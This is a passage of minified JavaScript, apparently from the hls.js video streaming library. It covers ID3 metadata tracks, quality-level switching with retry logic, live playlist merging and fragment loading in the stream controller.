a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/demux/id3.js"),u=r("./src/utils/texttrack-utils.js"),l=function(e){function t(t){var r=e.call(this,t,a.default.MEDIA_ATTACHED,a.default.MEDIA_DETACHING,a.default.FRAG_PARSING_METADATA)||this;return r.id3Track=void 0,r.media=void 0,r}return n(t,e),t.prototype.destroy=function(){s.default.prototype.destroy.call(this)},t.prototype.onMediaAttached=function(e){this.media=e.media,this.media},t.prototype.onMediaDetaching=function(){u.clearCurrentCues(this.id3Track),this.id3Track=void 0,this.media=void 0},t.prototype.getID3Track=function(e){for(var t=0;t<e.length;t++){var r=e[t];if("metadata"===r.kind&&"id3"===r.label)return u.sendAddTrackEvent(r,this.media),r}return this.media.addTextTrack("metadata","id3")},t.prototype.onFragParsingMetadata=function(e){var t=e.frag,r=e.samples;this.id3Track||(this.id3Track=this.getID3Track(this.media.textTracks),this.id3Track.mode="hidden");for(var i=window.WebKitDataCue||window.VTTCue||window.TextTrackCue,n=0;n<r.length;n++){var a=o.default.getID3Frames(r[n].data);if(a){var s=r[n].pts,u=n<r.length-1?r[n+1].pts:t.endPTS;s===u&&(u+=1e-4);for(var l=0;l<a.length;l++){var c=a[l];if(!o.default.isTimeStampFrame(c)){var d=new i(s,u,"");d.value=c,this.id3Track.addCue(d)}}}}},t}(s.default);t.default=l},"./src/controller/level-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a,s=r("./src/events.js"),o=r("./src/event-handler.js"),u=r("./src/utils/logger.js"),l=r("./src/errors.js"),c=r("./src/utils/codecs.js"),d=r("./src/controller/level-helper.js"),f=(window.performance,function(e){function t(t){var r=e.call(this,t,s.default.MANIFEST_LOADED,s.default.LEVEL_LOADED,s.default.AUDIO_TRACK_SWITCHED,s.default.FRAG_LOADED,s.default.ERROR)||this;return r.canload=!1,r.currentLevelIndex=null,r.manualLevelIndex=-1,r.timer=null,a=/chrome|firefox/.test(navigator.userAgent.toLowerCase()),r}return n(t,e),t.prototype.onHandlerDestroying=function(){this.clearTimer(),this.manualLevelIndex=-1},t.prototype.clearTimer=function(){null!==this.timer&&(clearTimeout(this.timer),this.timer=null)},t.prototype.startLoad=function(){var e=this._levels;this.canload=!0,this.levelRetryCount=0,e&&e.forEach(function(e){e.loadError=0;var t=e.details;t&&t.live&&(e.details=void 0)}),null!==this.timer&&this.loadLevel()},t.prototype.stopLoad=function(){this.canload=!1},t.prototype.onManifestLoaded=function(e){var t,r=[],i=[],n={},o=null,f=!1,h=!1;if(e.levels.forEach(function(e){var t=e.attrs;e.loadError=0,e.fragmentError=!1,f=f||!!e.videoCodec,h=h||!!e.audioCodec,a&&e.audioCodec&&-1!==e.audioCodec.indexOf("mp4a.40.34")&&(e.audioCodec=void 0),(o=n[e.bitrate])?o.url.push(e.url):(e.url=[e.url],e.urlId=0,n[e.bitrate]=e,r.push(e)),t&&(t.AUDIO&&(h=!0,d.addGroupId(o||e,"audio",t.AUDIO)),t.SUBTITLES&&d.addGroupId(o||e,"text",t.SUBTITLES))}),f&&h&&(r=r.filter(function(e){return!!e.videoCodec})),r=r.filter(function(e){var t=e.audioCodec,r=e.videoCodec;return(!t||c.isCodecSupportedInMp4(t,"audio"))&&(!r||c.isCodecSupportedInMp4(r,"video"))}),e.audioTracks&&(i=e.audioTracks.filter(function(e){return!e.audioCodec||c.isCodecSupportedInMp4(e.audioCodec,"audio")})).forEach(function(e,t){e.id=t}),r.length>0){t=r[0].bitrate,r.sort(function(e,t){return e.bitrate-t.bitrate}),this._levels=r;for(var p=0;p<r.length;p++)if(r[p].bitrate===t){this._firstLevel=p,u.logger.log("manifest loaded,"+r.length+" level(s) found, first bitrate:"+t);break}this.hls.trigger(s.default.MANIFEST_PARSED,{levels:r,audioTracks:i,firstLevel:this._firstLevel,stats:e.stats,audio:h,video:f,altAudio:i.some(function(e){return!!e.url})})}else this.hls.trigger(s.default.ERROR,{type:l.ErrorTypes.MEDIA_ERROR,details:l.ErrorDetails.MANIFEST_INCOMPATIBLE_CODECS_ERROR,fatal:!0,url:this.hls.url,reason:"no level with compatible codecs found in manifest"})},Object.defineProperty(t.prototype,"levels",{get:function(){return this._levels},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"level",{get:function(){return this.currentLevelIndex},set:function(e){var t=this._levels;t&&(e=Math.min(e,t.length-1),this.currentLevelIndex===e&&t[e].details||this.setLevelInternal(e))},enumerable:!0,configurable:!0}),t.prototype.setLevelInternal=function(e){var t=this._levels,r=this.hls;if(e>=0&&e<t.length){if(this.clearTimer(),this.currentLevelIndex!==e){u.logger.log("switching to level "+e),this.currentLevelIndex=e;var i=t[e];i.level=e,r.trigger(s.default.LEVEL_SWITCHING,i)}var n=t[e],a=n.details;if(!a||a.live){var o=n.urlId;r.trigger(s.default.LEVEL_LOADING,{url:n.url[o],level:e,id:o})}}else r.trigger(s.default.ERROR,{type:l.ErrorTypes.OTHER_ERROR,details:l.ErrorDetails.LEVEL_SWITCH_ERROR,level:e,fatal:!1,reason:"invalid level idx"})},Object.defineProperty(t.prototype,"manualLevel",{get:function(){return this.manualLevelIndex},set:function(e){this.manualLevelIndex=e,void 0===this._startLevel&&(this._startLevel=e),-1!==e&&(this.level=e)},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"firstLevel",{get:function(){return this._firstLevel},set:function(e){this._firstLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"startLevel",{get:function(){if(void 0===this._startLevel){var e=this.hls.config.startLevel;return void 0!==e?e:this._firstLevel}return this._startLevel},set:function(e){this._startLevel=e},enumerable:!0,configurable:!0}),t.prototype.onError=function(e){if(e.fatal)e.type===l.ErrorTypes.NETWORK_ERROR&&this.clearTimer();else{var t,r=!1,i=!1;switch(e.details){case l.ErrorDetails.FRAG_LOAD_ERROR:case l.ErrorDetails.FRAG_LOAD_TIMEOUT:case l.ErrorDetails.KEY_LOAD_ERROR:case l.ErrorDetails.KEY_LOAD_TIMEOUT:t=e.frag.level,i=!0;break;case l.ErrorDetails.LEVEL_LOAD_ERROR:case l.ErrorDetails.LEVEL_LOAD_TIMEOUT:t=e.context.level,r=!0;break;case l.ErrorDetails.REMUX_ALLOC_ERROR:t=e.level,r=!0}void 0!==t&&this.recoverLevel(e,t,r,i)}},t.prototype.recoverLevel=function(e,t,r,i){var n,a,s,o=this,l=this.hls.config,c=e.details,d=this._levels[t];if(d.loadError++,d.fragmentError=i,r){if(!(this.levelRetryCount+1<=l.levelLoadingMaxRetry))return u.logger.error("level controller, cannot recover from "+c+" error"),this.currentLevelIndex=null,this.clearTimer(),void(e.fatal=!0);a=Math.min(Math.pow(2,this.levelRetryCount)*l.levelLoadingRetryDelay,l.levelLoadingMaxRetryTimeout),this.timer=setTimeout(function(){return o.loadLevel()},a),e.levelRetry=!0,this.levelRetryCount++,u.logger.warn("level controller, "+c+", retry in "+a+" ms, current retry count is "+this.levelRetryCount)}(r||i)&&((n=d.url.length)>1&&d.loadError<n?(d.urlId=(d.urlId+1)%n,d.details=void 0,u.logger.warn("level controller, "+c+" for level "+t+": switching to redundant URL-id "+d.urlId)):-1===this.manualLevelIndex?(s=0===t?this._levels.length-1:t-1,u.logger.warn("level controller, "+c+": switch to "+s),this.hls.nextAutoLevel=this.currentLevelIndex=s):i&&(u.logger.warn("level controller, "+c+": reload a fragment"),this.currentLevelIndex=null))},t.prototype.onFragLoaded=function(e){var t=e.frag;if(void 0!==t&&"main"===t.type){var r=this._levels[t.level];void 0!==r&&(r.fragmentError=!1,r.loadError=0,this.levelRetryCount=0)}},t.prototype.onLevelLoaded=function(e){var t=this,r=e.level,i=e.details;if(r===this.currentLevelIndex){var n=this._levels[r];if(n.fragmentError||(n.loadError=0,this.levelRetryCount=0),i.live){var a=d.computeReloadInterval(n.details,i,e.stats.trequest);u.logger.log("live playlist, reload in "+Math.round(a)+" ms"),this.timer=setTimeout(function(){return t.loadLevel()},a)}else this.clearTimer()}},t.prototype.onAudioTrackSwitched=function(e){var t=this.hls.audioTracks[e.id].groupId,r=this.hls.levels[this.currentLevelIndex];if(r&&r.audioGroupIds){for(var i=-1,n=0;n<r.audioGroupIds.length;n++)if(r.audioGroupIds[n]===t){i=n;break}i!==r.urlId&&(r.urlId=i,this.startLoad())}},t.prototype.loadLevel=function(){if(u.logger.debug("call to loadLevel"),null!==this.currentLevelIndex&&this.canload){var e=this._levels[this.currentLevelIndex];if("object"==typeof e&&e.url.length>0){var t=this.currentLevelIndex,r=e.urlId,i=e.url[r];u.logger.log("Attempt loading level index "+t+" with URL-id "+r),this.hls.trigger(s.default.LEVEL_LOADING,{url:i,level:t,id:r})}}},Object.defineProperty(t.prototype,"nextLoadLevel",{get:function(){return-1!==this.manualLevelIndex?this.manualLevelIndex:this.hls.nextAutoLevel},set:function(e){this.level=e,-1===this.manualLevelIndex&&(this.hls.nextAutoLevel=e)},enumerable:!0,configurable:!0}),t}(o.default));t.default=f},"./src/controller/level-helper.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js");function n(t,r,n){var a=t[r],s=t[n],o=s.startPTS;e.isFinite(o)?n>r?(a.duration=o-a.start,a.duration<0&&i.logger.warn("negative duration computed for frag "+a.sn+",level "+a.level+", there should be some duration drift between playlist and fragment!")):(s.duration=a.start-o,s.duration<0&&i.logger.warn("negative duration computed for frag "+s.sn+",level "+s.level+", there should be some duration drift between playlist and fragment!")):s.start=n>r?a.start+a.duration:Math.max(a.start-s.duration,0)}function a(t,r,i,a,s,o){var u=i;if(e.isFinite(r.startPTS)){var l=Math.abs(r.startPTS-i);e.isFinite(r.deltaPTS)?r.deltaPTS=Math.max(l,r.deltaPTS):r.deltaPTS=l,u=Math.max(i,r.startPTS),i=Math.min(i,r.startPTS),a=Math.max(a,r.endPTS),s=Math.min(s,r.startDTS),o=Math.max(o,r.endDTS)}var c=i-r.start;r.start=r.startPTS=i,r.maxStartPTS=u,r.endPTS=a,r.startDTS=s,r.endDTS=o,r.duration=a-i;var d,f,h,p=r.sn;if(!t||p<t.startSN||p>t.endSN)return 0;for(d=p-t.startSN,(f=t.fragments)[d]=r,h=d;h>0;h--)n(f,h,h-1);for(h=d;h<f.length-1;h++)n(f,h,h+1);return t.PTSKnown=!0,c}function s(e,t,r){if(e&&t)for(var i=Math.max(e.startSN,t.startSN)-t.startSN,n=Math.min(e.endSN,t.endSN)-t.startSN,a=t.startSN-e.startSN,s=i;s<=n;s++){var o=e.fragments[a+s],u=t.fragments[s];if(!o||!u)break;r(o,u,s)}}function o(e,t){var r=t.startSN-e.startSN,i=e.fragments,n=t.fragments;if(!(r<0||r>i.length))for(var a=0;a<n.length;a++)n[a].start+=i[r].start}t.addGroupId=function(e,t,r){switch(t){case"audio":e.audioGroupIds||(e.audioGroupIds=[]),e.audioGroupIds.push(r);break;case"text":e.textGroupIds||(e.textGroupIds=[]),e.textGroupIds.push(r)}},t.updatePTS=n,t.updateFragPTSDTS=a,t.mergeDetails=function(t,r){r.initSegment&&t.initSegment&&(r.initSegment=t.initSegment);var n,u=0;if(s(t,r,function(t,i){u=t.cc-i.cc,e.isFinite(t.startPTS)&&(i.start=i.startPTS=t.startPTS,i.endPTS=t.endPTS,i.duration=t.duration,i.backtracked=t.backtracked,i.dropped=t.dropped,n=i),r.PTSKnown=!0}),r.PTSKnown){if(u){i.logger.log("discontinuity sliding from playlist, take drift into account");for(var l=r.fragments,c=0;c<l.length;c++)l[c].cc+=u}n?a(r,n,n.startPTS,n.endPTS,n.startDTS,n.endDTS):o(t,r),r.PTSKnown=t.PTSKnown}},t.mergeSubtitlePlaylists=function(e,t,r){void 0===r&&(r=0);var i=-1;s(e,t,function(e,t,r){t.start=e.start,i=r});var n=t.fragments;if(i<0)n.forEach(function(e){e.start+=r});else for(var a=i+1;a<n.length;a++)n[a].start=n[a-1].start+n[a-1].duration},t.mapFragmentIntersection=s,t.adjustSliding=o,t.computeReloadInterval=function(e,t,r){var i=1e3*(t.averagetargetduration?t.averagetargetduration:t.targetduration),n=i/2;return e&&t.endSN===e.endSN&&(i=n),r&&(i=Math.max(n,i-(window.performance.now()-r))),Math.round(i)}}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/stream-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/utils/binary-search.js"),s=r("./src/utils/buffer-helper.js"),o=r("./src/demux/demuxer.js"),u=r("./src/events.js"),l=r("./src/controller/fragment-tracker.js"),c=r("./src/loader/fragment.js"),d=r("./src/loader/playlist-loader.js"),f=r("./src/controller/level-helper.js"),h=r("./src/utils/time-ranges.js"),p=r("./src/errors.js"),g=r("./src/utils/logger.js"),y=r("./src/utils/discontinuities.js"),v=r("./src/controller/fragment-finders.js"),m=r("./src/controller/gap-controller.js"),L=r("./src/controller/base-stream-controller.js"),M=function(t){function r(e,r){var i=t.call(this,e,u.default.MEDIA_ATTACHED,u.default.MEDIA_DETACHING,u.default.MANIFEST_LOADING,u.default.MANIFEST_PARSED,u.default.LEVEL_LOADED,u.default.KEY_LOADED,u.default.FRAG_LOADED,u.default.FRAG_LOAD_EMERGENCY_ABORTED,u.default.FRAG_PARSING_INIT_SEGMENT,u.default.FRAG_PARSING_DATA,u.default.FRAG_PARSED,u.default.ERROR,u.default.AUDIO_TRACK_SWITCHING,u.default.AUDIO_TRACK_SWITCHED,u.default.BUFFER_CREATED,u.default.BUFFER_APPENDED,u.default.BUFFER_FLUSHED)||this;return i.fragmentTracker=r,i.config=e.config,i.audioCodecSwap=!1,i._state=L.State.STOPPED,i.stallReported=!1,i.gapController=null,i}return n(r,t),r.prototype.startLoad=function(e){if(this.levels){var t=this.lastCurrentTime,r=this.hls;if(this.stopLoad(),this.setInterval(100),this.level=-1,this.fragLoadError=0,!this.startFragRequested){var i=r.startLevel;-1===i&&(i=0,this.bitrateTest=!0),this.level=r.nextLoadLevel=i,this.loadedmetadata=!1}t>0&&-1===e&&(g.logger.log("override startPosition with lastCurrentTime @"+t.toFixed(3)),e=t),this.state=L.State.IDLE,this.nextLoadPosition=this.startPosition=this.lastCurrentTime=e,this.tick()}else this.forceStartLoad=!0,this.state=L.State.STOPPED},r.prototype.stopLoad=function(){this.forceStartLoad=!1,t.prototype.stopLoad.call(this)},r.prototype.doTick=function(){switch(this.state){case L.State.BUFFER_FLUSHING:this.fragLoadError=0;break;case L.State.IDLE:this._doTickIdle();break;case L.State.WAITING_LEVEL:var e=this.levels[this.level];e&&e.details&&(this.state=L.State.IDLE);break;case L.State.FRAG_LOADING_WAITING_RETRY:var t=window.performance.now(),r=this.retryDate;(!r||t>=r||this.media&&this.media.seeking)&&(g.logger.log("mediaController: retryDate reached, switch back to IDLE state"),this.state=L.State.IDLE);break;case L.State.ERROR:case L.State.STOPPED:case L.State.FRAG_LOADING:case L.State.PARSING:case L.State.PARSED:case L.State.ENDED:}this._checkBuffer(),this._checkFragmentChanged()},r.prototype._doTickIdle=function(){var e=this.hls,t=e.config,r=this.media;if(void 0!==this.levelLastLoaded&&(r||!this.startFragRequested&&t.startFragPrefetch)){var i;i=this.loadedmetadata?r.currentTime:this.nextLoadPosition;var n=e.nextLoadLevel,a=this.levels[n];if(a){var o,l=a.bitrate;o=l?Math.max(8*t.maxBufferSize/l,t.maxBufferLength):t.maxBufferLength,o=Math.min(o,t.maxMaxBufferLength);var c=s.BufferHelper.bufferInfo(this.mediaBuffer?this.mediaBuffer:r,i,t.maxBufferHole),d=c.len;if(!(d>=o)){g.logger.trace("buffer length of "+d.toFixed(3)+" is below max of "+o.toFixed(3)+". checking for more payload ..."),this.level=e.nextLoadLevel=n;var f=a.details;if(!f||f.live&&this.levelLastLoaded!==n)this.state=L.State.WAITING_LEVEL;else{if(this._streamEnded(c,f)){var h={};return this.altAudio&&(h.type="video"),this.hls.trigger(u.default.BUFFER_EOS,h),void(this.state=L.State.ENDED)}this._fetchPayloadOrEos(i,c,f)}}}}},r.prototype._fetchPayloadOrEos=function(e,t,r){var i=this.fragPrevious,n=this.level,a=r.fragments,s=a.length;if(0!==s){var o,u=a[0].start,l=a[s-1].start+a[s-1].duration,c=t.end;if(r.initSegment&&!r.initSegment.data)o=r.initSegment;else if(r.live){var d=this.config.initialLiveManifestSize;if(s<d)return void g.logger.warn("Can not start playback of a level, reason: not enough fragments "+s+" < "+d);if(null===(o=this._ensureFragmentAtLivePoint(r,c,u,l,i,a,s)))return}else c<u&&(o=a[0]);o||(o=this._findFragment(u,i,s,a,c,l,r)),o&&(o.encrypted?(g.logger.log("Loading key for "+o.sn+" of ["+r.startSN+" ,"+r.endSN+"],level "+n),this._loadKey(o)):(g.logger.log("Loading "+o.sn+" of ["+r.startSN+" ,"+r.endSN+"],level "+n+", currentTime:"+e.toFixed(3)+",bufferEnd:"+c.toFixed(3)),this._loadFragment(o)))}},r.prototype._ensureFragmentAtLivePoint=function(e,t,r,i,n,s,o){var u,l=this.hls.config,c=this.media,d=void 0!==l.liveMaxLatencyDuration?l.liveMaxLatencyDuration:l.liveMaxLatencyDurationCount*e.targetduration;if(t<Math.max(r-l.maxFragLookUpTolerance,i-d)){var f=this.liveSyncPosition=this.computeLivePosition(r,e);g.logger.log("buffer end: "+t.toFixed(3)+" is located too far from the end of live sliding playlist, reset currentTime to : "+f.toFixed(3)),t=f,c&&c.readyState&&c.duration>f&&(c.currentTime=f),this.nextLoadPosition=f}if(e.PTSKnown&&t>i&&c&&c.readyState)return null;if(this.startFragRequested&&!e.PTSKnown){if(n)if(e.hasProgramDateTime)g.logger.log("live playlist, switching playlist, load frag with same PDT: "+n.programDateTime),u=v.findFragmentByPDT(s,n.endProgramDateTime,l.maxFragLookUpTolerance);else{var h=n.sn+1;if(h>=e.startSN&&h<=e.endSN){var p=s[h-e.startSN];n.cc===p.cc&&(u=p,g.logger.log("live playlist, switching playlist, load frag with next SN: "+u.sn))}u||(u=a.default.search(s,function(e){return n.cc-e.cc}))&&g.logger.log("live playlist, switching playlist, load frag with same CC: "+u.sn)}u||(u=s[Math.min(o-1,Math.round(o/2))],g.logger.log("live playlist, switching playlist, unknown, load middle frag : "+u.sn))}return u},r.prototype._findFragment=function(e,t,r,i,n,a,s){var o,u=this.hls.config;if(n<a){var l=n>a-u.maxFragLookUpTolerance?0:u.maxFragLookUpTolerance;o=v.findFragmentByPTS(t,i,n,l)}else o=i[r-1];if(o){var c=o.sn-s.startSN,d=t&&o.level===t.level,f=i[c-1],h=i[c+1];if(t&&o.sn===t.sn)if(d&&!o.backtracked)if(o.sn<s.endSN){var p=t.deltaPTS;p&&p>u.maxBufferHole&&t.dropped&&c?(o=f,g.logger.warn("SN just loaded, with large PTS gap between audio and video, maybe frag is not starting with a keyframe ? load previous one to try to overcome this")):(o=h,g.logger.log("SN just loaded, load next one: "+o.sn,o))}else o=null;else o.backtracked&&(h&&h.backtracked?(g.logger.warn("Already backtracked from fragment "+h.sn+", will not backtrack to fragment "+o.sn+". Loading fragment "+h.sn),o=h):(g.logger.warn("Loaded fragment with dropped frames, backtracking 1 segment to find a keyframe"),o.dropped=0,f?(o=f).backtracked=!0:c&&(o=null)))}return o},r.prototype._loadKey=function(e){this.state=L.State.KEY_LOADING,this.hls.trigger(u.default.KEY_LOADING,{frag:e})},r.prototype._loadFragment=function(t){var r=this.fragmentTracker.getState(t);this.fragCurrent=t,this.startFragRequested=!0,e.isFinite(t.sn)&&!t.bitrateTest&&(this.nextLoadPosition=t.start+t.duration),t.backtracked||r===l.FragmentState.NOT_LOADED||r===l.FragmentState.PARTIAL?(t.autoLevel=this.hls.autoLevelEnabled,t.bitrateTest=this.bitrateTest,this.hls.trigger(u.default.FRAG_LOADING,{frag:t}),this.demuxer||(this.demuxer=new o.default(this.hls,"main")),this.state=L.State.FRAG_LOADING):r===l.FragmentState.APPENDING&&this._reduceMaxBufferLength(t.duration)&&this.fragmentTracker.removeFragment(t)},Object.defineProperty(r.prototype,"state",{get:function(){return this._state},set:function(e){if(this.state!==e){var t=this.state;this._state=e,g.logger.log("main stream:"+t+"->"+e),this.hls.trigger(u.default.STREAM_STATE_TRANSITION,{previousState:t,nextState:e})}},enumerable:!0,configurable:!0}),r.prototype.getBufferedFrag=function(e){return this.fragmentTracker.getBufferedFrag(e,d.default.LevelType.MAIN)},Object.defineProperty(r.prototype,"currentLevel",{get:function(){var e=this.media;if(e){var t=this.getBufferedFrag(e.currentTime);if(t)return t.level}return-1},enumerable:!0,configurable:!0}),Object.defineProperty(r.prototype,"nextBufferedFrag",{get:function(){var e=this.media;return e?this.followingBufferedFrag(this.getBufferedFrag(e.currentTime)):null},enumerable:!0,configurable:!0}),r.prototype.followingBufferedFrag=function(e){return e?this.getBufferedFrag(e.endPTS+.5):null},Object.defineProperty(r.prototype,"nextLevel",{get:function(){var e=this.nextBufferedFrag;return e?e.level:-1},enumerable:!0,configurable:!0}),r.prototype._checkFragmentChanged=function(){var e,t,r=this.media;if(r&&r.readyState&&!1===r.seeking&&((t=r.currentTime)>this.lastCurrentTime&&(this.lastCurrentTime=t),s.BufferHelper.isBuffered(r,t)?e=this.getBufferedFrag(t):s.BufferHelper.isBuffered(r,t+.1)&&(e=this.getBufferedFrag(t+.1)),e)){var i=e;if(i!==this.fragPlaying){this.hls.trigger(u.default.FRAG_CHANGED,{frag:i});var n=i.level;this.fragPlaying&&this.fragPlaying.level===n||this.hls.trigger(u.default.LEVEL_SWITCHED,{level:n}),this.fragPlaying=i}}},r.prototype.immediateLevelSwitch=function(){if(g.logger.log("immediateLevelSwitch"),!this.immediateSwitch){this.immediateSwitch=!0;var t=this.media,r=void 0;t?(r=t.paused,t.pause()):r=!0,this.previouslyPaused=r}var i=this.fragCurrent;i&&i.loader&&i.loader.abort(),this.fragCurrent=null,this.flushMainBuffer(0,e.POSITIVE_INFINITY)},r.prototype.immediateLevelSwitchEnd=function(){var e=this.media;e&&e.buffered.length&&(this.immediateSwitch=!1,s.BufferHelper.isBuffered(e,e.currentTime)&&(e.currentTime-=1e-4),this.previouslyPaused||e.play())},r.prototype.nextLevelSwitch=function(){var t=this.media;if(t&&t.readyState){var r,i=void 0,n=void 0;if((r=this.getBufferedFrag(t.currentTime))&&r.startPTS>1&&this.flushMainBuffer(0,r.startPTS-1),t.paused)i=0;else{var a=this.hls.nextLoadLevel,s=this.levels[a],o=this.fragLastKbps;i=o&&this.fragCurrent?this.fragCurrent.duration*s.bitrate/(1e3*o)+1:0}if((n=this.getBufferedFrag(t.currentTime+i))&&(n=this.followingBufferedFrag(n))){var u=this.fragCurrent;u&&u.loader&&u.loader.abort(),this.fragCurrent=null,this.flushMainBuffer(n.maxStartPTS,e.POSITIVE_INFINITY)}}},r.prototype.flushMainBuffer=function(e,t){this.state=L.State.BUFFER_FLUSHING;var r={startOffset:e,endOffset:t};this.altAudio&&(r.type="video"),this.hls.trigger(u.default.BUFFER_FLUSHING,r)},r.prototype.onMediaAttached=function(e){var t=this.media=this.mediaBuffer=e.media;this.onvseeking=this.onMediaSeeking.bind(this),this.onvseeked=this.onMediaSeeked.bind(this),this.onvended=this.onMediaEnded.bind(this),t.addEventListener("seeking",this.onvseeking),t.addEventListener("seeked",this.onvseeked),t.addEventListener("ended",this.onvended);var r=this.config;this.levels&&r.autoStartLoad&&this.hls.startLoad(r.startPosition),this.gapController=new m.default(r,t,this.fragmentTracker,this.hls)},r.prototype.onMediaDetaching=function(){var e=this.media;e&&e.ended&&(g.logger.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0);var t=this.levels;t&&t.forEach(function(e){e.details&&e.details.fragments.forEach(function(e){e.backtracked=void 0})}),e&&(e.removeEventListener("seeking",this.onvseeking),e.removeEventListener("seeked",this.onvseeked),e.removeEventListener("ended",this.onvended),this.onvseeking=this.onvseeked=this.onvended=null),this.media=this.mediaBuffer=null,this.loadedmetadata=!1,this.stopLoad()},r.prototype.onMediaSeeked=function(){var t=this.media,r=t?t.currentTime:void 0;e.isFinite(r)&&g.logger.log("media seeked to "+r.toFixed(3)),this.tick()},r.prototype.onManifestLoading=function(){g.logger.log("trigger BUFFER_RESET"),this.hls.trigger(u.default.BUFFER_RESET),this.fragmentTracker.removeAllFragments(),this.stalled=!1,this.startPosition=this.lastCurrentTime=0},r.prototype.onManifestParsed=function(e){var t,r=!1,i=!1;e.levels.forEach(function(e){(t=e.audioCodec)&&(-1!==t.indexOf("mp4a.40.2")&&(r=!0),-1!==t.indexOf("mp4a.40.5")&&(i=!0))}),this.audioCodecSwitch=r&&i,this.audioCodecSwitch&&g.logger.log("both AAC/HE-AAC audio found in levels; declaring level codec as HE-AAC"),this.levels=e.levels,this.startFragRequested=!1;var n=this.config;(n.autoStartLoad||this.forceStartLoad)&&this.hls.startLoad(n.startPosition)},r.prototype.onLevelLoaded=function(t){var r=t.details,i=t.level,n=this.levels[this.levelLastLoaded],a=this.levels[i],s=r.totalduration,o=0;if(g.logger.log("level "+i+" loaded ["+r.startSN+","+r.endSN+"],duration:"+s),r.live){var l=a.details;l&&r.fragments.length>0?(f.mergeDetails(l,r),o=r.fragments[0].start,this.liveSyncPosition=this.computeLivePosition(o,l),r.PTSKnown&&e.isFinite(o)?g.logger.log("live playlist sliding:"+o.toFixed(3)):(g.logger.log("live playlist - outdated PTS, unknown sliding"),y.alignStream(this.fragPrevious,n,r))):(g.logger.log("live playlist - first load, unknown sliding"),r.PTSKnown=!1,y.alignStream(this.fragPrevious,n,r))}else r.PTSKnown=!1;if(a.details=r,this.levelLastLoaded=i,this.hls.trigger(u.default.LEVEL_UPDATED,{details:r,level:i}),!1===this.startFragRequested){if(-1===this.startPosition||-1===this.lastCurrentTime){var c=r.startTimeOffset;e.isFinite(c)?(c<0&&(g.logger.log("negative start time offset "+c+", count from end of last fragment"),c=o+s+c),g.logger.log("start time offset found in playlist, adjust startPosition to "+c),this.startPosition=c):r.live?(this.startPosition=this.computeLivePosition(o,r),g.logger.log("configure startPosition to "+this.startPosition)):this.startPosition=0,this.lastCurrentTime=this.startPosition}this.nextLoadPosition=this.startPosition}this.state===L.State.WAITING_LEVEL&&(this.state=L.State.IDLE),this.tick()},r.prototype.onKeyLoaded=function(){this.state===L.State.KEY_LOADING&&(this.state=L.State.IDLE,this.tick())},r.prototype.onFragLoaded=function(e){var t=this.fragCurrent,r=this.hls,i=this.levels,n=this.media,a=e.frag;if(this.state===L.State.FRAG_LOADING&&t&&"main"===a.type&&a.level===t.level&&a.sn===t.sn){var s=e.stats,l=i[t.level],c=l.details;if(this.bitrateTest=!1,this.stats=s,g.logger.log("Loaded "+t.sn+" of ["+c.startSN+" ,"+c.endSN+"],level "+t.level),a.bitrateTest&&r.nextLoadLevel)this.state=L.State.IDLE,this.startFragRequested=!1,s.tparsed=s.tbuffered=window.performance.now(),r.trigger(u.default.FRAG_BUFFERED,{stats:s,frag:t,id:"main"}),this.tick();else if("initSegment"===a.sn)this.state=L.State.IDLE,s.tparsed=s.tbuffered=window.performance.now(),c.initSegment.data=e.payload,r.trigger(u.default.FRAG_BUFFERED,{stats:s,frag:t,id:"main"}),this.tick();else{g.logger.log("Parsing "+t.sn+" of ["+c.startSN+" ,"+c.endSN+"],level "+t.level+", cc "+t.cc),this.state=L.State.PARSING,this.pendingBuffering=!0,this.appended=!1,a.bitrateTest&&(a.bitrateTest=!1,this.fragmentTracker.onFragLoaded({frag:a}));var d=!(n&&n.seeking)&&(c.PTSKnown||!c.live),f=c.initSegment?c.initSegment.data:[],h=this._getAudioCodec(l);(this.demuxer=this.demuxer||new o.default(this.hls,"main")).push(e.payload,f,h,l.videoCodec,t,c.totalduration,d)}}this.fragLoadError=0},r.prototype.onFragParsingInitSegment=function(e){var t=this.fragCurrent,r=e.frag;if(t&&"main"===e.id&&r.sn===t.sn&&r.level===t.level&&this.state===L.State.PARSING){var i=e.tracks,n=void 0,a=void 0;if(i.audio&&this.altAudio&&delete i.audio,a=i.audio){var s=this.levels[this.level].audioCodec,o=navigator.userAgent.toLowerCase();s&&this.audioCodecSwap&&(g.logger.log("swapping playlist audio codec"),s=-1!==s.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),this.audioCodecSwitch&&1!==a.metadata.channelCount&&-1===o.indexOf("firefox")&&(s="mp4a.40.5"),-1!==o.indexOf("android")&&"audio/mpeg"!==a.container&&(s="mp4a.40.2",g.logger.log("Android: force audio codec to "+s)),a.levelCodec=s,a.id=e.id}for(n in(a=i.video)&&(a.levelCodec=this.levels[this.level].videoCodec,a.id=e.id),this.hls.trigger(u.default.BUFFER_CODECS,i),i){a=i[n],g.logger.log("main track:"+n+",container:"+a.container+",codecs[level/parsed]=["+a.levelCodec+"/"+a.codec+"]");var l=a.initSegment;l&&(this.appended=!0,this.pendingBuffering=!0,this.hls.trigger(u.default.BUFFER_APPENDING,{type:n,data:l,parent:"main",content:"initSegment"}))}this.tick()}},r.prototype.onFragParsingData=function(t){var 